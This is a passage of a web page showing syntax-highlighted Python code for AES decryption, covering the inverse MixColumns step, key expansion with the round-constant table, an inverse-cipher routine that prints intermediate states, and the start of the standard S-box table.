operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> \                self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x09</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">0</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0e</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">1</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0b</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span>                    <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0d</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">3</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> \                self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0d</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">0</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x09</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">1</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0e</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span>                    <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0b</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">3</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> \                self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0b</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">0</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0d</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">1</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x09</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span>                    <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>GMUL<span class="token punctuation">(</span><span class="token number">0x0e</span><span class="token punctuation">,</span> raws<span class="token punctuation">[</span><span class="token number">3</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> raws    <span class="token keyword">def</span> <span class="token function">RotWord</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> temp<span class="token punctuation">)</span><span class="token punctuation">:</span>        b0 <span class="token operator">=</span> temp<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        temp<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> b0<span class="token punctuation">)</span>        <span class="token keyword">return</span> temp    <span class="token keyword">def</span> <span class="token function">SubWord</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> temp<span class="token punctuation">)</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> self<span class="token punctuation">.</span>SubBytes<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>        <span class="token keyword">return</span> temp    <span class="token keyword">def</span> <span class="token function">KeyExpansion</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token number">0</span>        w <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>Nb <span class="token operator">*</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>Nr <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        Rcon <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span>                <span class="token punctuation">]</span>        <span class="token keyword">while</span> i <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>Nk<span class="token punctuation">:</span>            w<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>key<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>        i <span class="token operator">=</span> self<span class="token punctuation">.</span>Nk        <span class="token keyword">while</span> i <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>Nb <span class="token operator">*</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>Nr <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            temp <span class="token operator">=</span> w<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> i <span class="token operator">%</span> self<span class="token punctuation">.</span>Nk <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                temp <span class="token operator">=</span> self<span class="token punctuation">.</span>SubWord<span class="token punctuation">(</span>self<span class="token punctuation">.</span>RotWord<span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span>                temp2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                <span class="token keyword">for</span> temp1<span class="token punctuation">,</span> Rcon1 <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> Rcon<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">//</span> self<span class="token punctuation">.</span>Nk<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    temp2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp1 <span class="token operator">^</span> Rcon1<span class="token punctuation">)</span>                temp <span class="token operator">=</span> temp2            <span class="token keyword">elif</span> self<span class="token punctuation">.</span>Nk <span class="token operator">></span> <span class="token number">6</span> <span class="token keyword">and</span> i <span class="token operator">%</span> self<span class="token punctuation">.</span>Nk <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>                temp <span class="token operator">=</span> self<span class="token punctuation">.</span>SubWord<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>            w_temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            <span class="token keyword">for</span> w1<span class="token punctuation">,</span> temp1 <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>w<span class="token punctuation">[</span>i <span class="token operator">-</span> self<span class="token punctuation">.</span>Nk<span class="token punctuation">]</span><span class="token punctuation">,</span> temp<span class="token punctuation">)</span><span class="token punctuation">:</span>                w_temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>w1 <span class="token operator">^</span> temp1<span class="token punctuation">)</span>            w<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> w_temp            i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">return</span> w    <span class="token keyword">def</span> <span class="token function">IAES</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> IInput<span class="token punctuation">,</span> Cipher_Key<span class="token punctuation">,</span>inv_s_box<span class="token punctuation">)</span><span class="token punctuation">:</span>        IInput <span class="token operator">=</span> <span class="token punctuation">[</span>IInput1 <span class="token keyword">for</span> IInput1 <span class="token keyword">in</span> IInput<span class="token punctuation">]</span>        Cipher_Key <span class="token operator">=</span> <span class="token punctuation">[</span>Cipher_Key1 <span class="token keyword">for</span> Cipher_Key1 <span class="token keyword">in</span> Cipher_Key<span class="token punctuation">]</span>        KeyExpansion <span class="token operator">=</span> self<span class="token punctuation">.</span>KeyExpansion<span class="token punctuation">(</span>Cipher_Key<span class="token punctuation">)</span>        keys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> Key_index <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>KeyExpansion<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            keys_temp <span class="token operator">=</span> <span class="token punctuation">(</span>KeyExpansion<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> Key_index<span class="token punctuation">]</span> <span class="token operator">+</span> KeyExpansion<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> Key_index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> KeyExpansion<span class="token punctuation">[</span>                <span class="token number">4</span> <span class="token operator">*</span> Key_index <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> KeyExpansion<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> Key_index <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            keys_temp <span class="token operator">=</span> self<span class="token punctuation">.</span>arrays<span class="token punctuation">(</span>keys_temp<span class="token punctuation">)</span>            keys<span class="token punctuation">.</span>append<span class="token punctuation">(</span>keys_temp<span class="token punctuation">)</span>        IInput <span class="token operator">=</span> self<span class="token punctuation">.</span>arrays<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>keys<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        IInput <span class="token operator">=</span> self<span class="token punctuation">.</span>AddRoundKey<span class="token punctuation">(</span>IInput<span class="token punctuation">,</span> keys<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>        <span class="token keyword">for</span> index <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>Nr <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            IInput <span class="token operator">=</span> self<span class="token punctuation">.</span>InvShiftRows<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>            IInput <span class="token operator">=</span> self<span class="token punctuation">.</span>InvSubBytes<span class="token punctuation">(</span>IInput<span class="token punctuation">,</span>inv_s_box<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>keys<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> index<span class="token punctuation">]</span><span class="token punctuation">)</span>            IInput <span class="token operator">=</span> self<span class="token punctuation">.</span>AddRoundKey<span class="token punctuation">(</span>IInput<span class="token punctuation">,</span> keys<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> index<span class="token punctuation">]</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>            IInput <span class="token operator">=</span> self<span class="token punctuation">.</span>InvMixColumns<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>        IInput <span class="token operator">=</span> self<span class="token punctuation">.</span>InvShiftRows<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>        IInput <span class="token operator">=</span> self<span class="token punctuation">.</span>InvSubBytes<span class="token punctuation">(</span>IInput<span class="token punctuation">,</span>inv_s_box<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>keys<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        IInput <span class="token operator">=</span> self<span class="token punctuation">.</span>AddRoundKey<span class="token punctuation">(</span>IInput<span class="token punctuation">,</span> keys<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>view<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>        IInput <span class="token operator">=</span> self<span class="token punctuation">.</span>Inv_arrays<span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>        IInput <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>        <span class="token keyword">return</span> IInputS_box <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x7c</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x7b</span><span class="token punctuation">,</span> <span class="token number">0xf2</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x6f</span><span class="token punctuation">,</span> <span class="token number">0xc5</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x2b</span><span class="token punctuation">,</span> <span class="token number">0xfe</span><span class="token punctuation">,</span> <span class="token number">0xd7</span><span class="token punctuation">,</span> <span class="token number">0xab</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span>    <span class="token number">0xca</span><span class="token punctuation">,</span> <span class="token number">0x82</span><span class="token punctuation">,</span> <span class="token number">0xc9</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0xfa</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0xf0</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0xd4</span><span class="token punctuation">,</span> <span class="token number">0xa2</span><span class="token punctuation">,</span> <span class="token number">0xaf</span><span class="token punctuation">,</span> <span class="token number">0x9c</span><span class="token punctuation">,</span> <span class="token number">0xa4</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span>    <span class="token number">0xb7</span><span class="token punctuation">,</span> <span class="token number">0xfd</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xe5</span><span class="token punctuation">,</span> <span class="token number">0xf1</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0xd8</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span>    <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0xc7</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0xc3</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x9a</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xe2</span><span class="token punctuation">,</span> <span class="token number">0xeb</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0xb2</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span>    <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x1a</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x6e</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0xa0</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x3b</span><span class="token punctuation">,</span> <span class="token number">0xd6</span><span class="token punctuation">,</span> <span class="token number">0xb3</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0xe3</span><span class="token punctuation">,</span> <span class="token number">0x2f</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span>    <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0xd1</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0xed</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0xfc</span><span class="token punctuation">,</span> <span class="token number">0xb1</span><span class="token punctuation">,</span> <span class="token number">0x5b</span><span class="token punctuation">,</span> <span class="token number">0x6a</span><span class="token punctuation">,</span> <span class="token number">0xcb</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x4a</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0xcf</span><span class="token punctuation">,</span>    <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0xef</span><span class="token punctuation">,</span> <span class="token number">0xaa</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x4d</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x7f</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x3c</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0xa8</span><span class="token punctuation">,</span>    <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x8f</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0xf5</span><span class="token punctuation">,</span> <span class="token number">0xbc</span><span class="token punctuation">,</span> <span class="token number">0xb6</span><span class="token punctuation">,</span> <span class="token number">0xda</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xf3</span><span class="token punctuation">,</span> <span class="token number">0xd2</span><span class="token punctuation">,</span>    <span class="token number">0xcd</span><span class="token punctuation">,</span> <span class="token number">0x0c</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0xec</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xc4</span><span class="token punctuation">,</span> <span class="token number">0xa7</span><span class="token punctuation">,</span> <span class="token number">0x7e</span><span class="token punctuation">,</span> <span class="token number">0x3d</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span>    <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0x4f</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x2a</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0xee</span><span class="token punctuation">,</span> <span class="token number">0xb8</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0xde</span><span class="token punctuation">,</span> <span class="token number">0x5e</span><span class="token punctuation">,</span> <span class="token number">0x0b</span><span class="token punctuation">,</span> <span class="token number">0xdb</span><span class="token punctuation">,</span>    <span class="token number">0xe0</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x3a</span><span class="token punctuation">,</span> <span class="token number">0x0a</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x5c</span><span class="token punctuation">,</span> <span class="token number">0xc2</span><span class="token punctuation">,</span> <span class="token number">0xd3</span><span class="token punctuation">,</span> <span class="token number">0xac</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0xe4</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span>    <span class="token number">0xe7</span><span class="token punctuation">,</span> <span class="token number">0xc8</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x6d</span><span class="token punctuation">,</span> <span class="token number">0x8d</span><span class="token punctuation">,</span> <span class="token number">0xd5</span><span class="token punctuation">,</span> <span class="token number">0x4e</span><span class="token punctuation">,</span> <span class="token number">0xa9</span><span class="token punctuation">,</span> <span class="token number">0x6c</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0xf4</span><span class="token punctuation">,</span> <span class="token number">0xea</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span>    <span class="token number">0xba</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x2e</span><span class="token punctuation">,</span> <span class="token number">0x1c</span><span class="token punctuation">,</span> <span class="token number">0xa6</span><span class="token punctuation">,</span> <span class="token number">0xb4</span><span class="token punctuation">,</span> <span class="token number">0xc6</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">,</span> <span class="token number">0xdd</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x1f</span><span class="token punctuation">,</span> <span class="token number">0x4b</span><span class="token punctuation">,</span> <span class="token number">0xbd</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span>    <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x3e</span><span class="token punctuation">,</span> <span class="token number">0xb5</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xb9</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0xc1</span><span class="token punctuation">,</span> <span class="token number">0x1d</span><span class="token punctuation">,</span> <span class="token number">0x9e</span><span class="token punctuation">,</span>    <span class="token number">0xe1</span><span class="token 